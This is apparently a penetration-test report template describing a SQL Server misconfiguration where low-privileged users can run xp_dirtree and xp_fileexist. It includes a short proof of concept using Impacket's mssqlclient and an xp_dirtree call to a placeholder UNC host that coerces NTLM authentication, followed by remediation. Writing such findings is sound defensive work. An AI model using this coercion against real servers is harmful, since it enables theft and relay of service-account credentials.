---
category: "CNF"
cvss: "5.3"
---
### SQL Server Stored Procedures Enabled
Review of the SQL servers listed above revealed that native extended stored procedures such as "xp_fileexist" and "xp_dirtree" were enabled and accessible by low privileged users who are members of the "Public" role.

An attacker could leverage these stored procedures to force the SQL Server instance to authenticate to a remote attacker-controlled host. The connection triggered will automatically include an authentication challenge that contains the hashed Windows credentials of the account running the SQL Server instance.

The following proof of concept shows how Net-NTLM hashes for the service account that the SQL server is running as, can be obtained, using the public "mssqlclient.py" Python script from the Impacket suite:


{==POC==}
`$ mssqclient.py domain/user:password@target`
```
{==PASTE_OUTPUT==}
xp_dirtree \\\\ip\\share

{==PASTE_OUTPUT_RESPONDER==}
```
The above command is equivalent to running the following query on the server directly:

```
exec master.sys.xp_dirtree '\\ip\',1, 1
```
#### Impact: Medium
The stored procedures that are enabled may be used by unprivileged users that had previously gained access to the server. Such an authenticated attacker can force a connection to a target system of their choice that could allow them to either attempt to crack the NTLM hash offline, or relay the connection to another system.
#### Likelihood: Medium
An attacker would need to first gain access to the SQL servers. Additionally, the SQL server needs to run under an account with privileges on other systems or databases or the account needs to have a weak password. OPTION Note that this was {==not==} seen to be the case on the above systems.
#### Recommendation
Remove EXECUTE privileges on the "xp_fileexist" and "xp_dirtree" procedures for non-administrative logins and roles. Example of commands for the "Public" role is shown below:
```
REVOKE EXECUTE ON xp_fileexist to Public
REVOKE EXECUTE ON xp_dirtree to Public
```
See the following URL for more information:

https://docs.microsoft.com/en-us/sql/relational-databases/stored-procedures/delete-a-stored-procedure?view=sql-server-ver15
